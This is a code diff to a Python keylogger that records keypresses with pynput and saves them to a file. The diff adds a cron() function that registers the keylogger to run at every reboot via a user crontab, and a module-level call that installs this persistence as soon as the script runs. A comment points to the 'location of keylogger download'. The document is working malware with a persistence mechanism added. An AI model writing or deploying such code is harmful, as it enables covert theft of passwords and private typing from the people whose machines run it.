@@ -2,6 +2,7 @@
 
 #Import Key and Listener module
 from pynput.keyboard import Key, Listener
+from crontab import CronTab
 
 count = 0
 keys = []
@@ -26,7 +27,13 @@ def on_press(key):
     write_file(keys)
     #Resets keys
     keys = []
-
+    
+def cron():
+    my_cron = CronTab(user=True)
+    job = my_cron.new(command='python <FILEPATH>')  # edit filepath to location of keylogger download
+    job.every_reboot()
+    my_cron.write()
+    
 #write to a file
 #text file can be named how you see fit
 def write_file(key):
@@ -39,6 +46,8 @@ def write_file(key):
 def on_release(key):
   if key==Key.esc:
     return my_bool
+  
+cron()
     
 #Will continously loop through until broken
 with Listener(on_press=on_press, on_release=on_release) as listener:
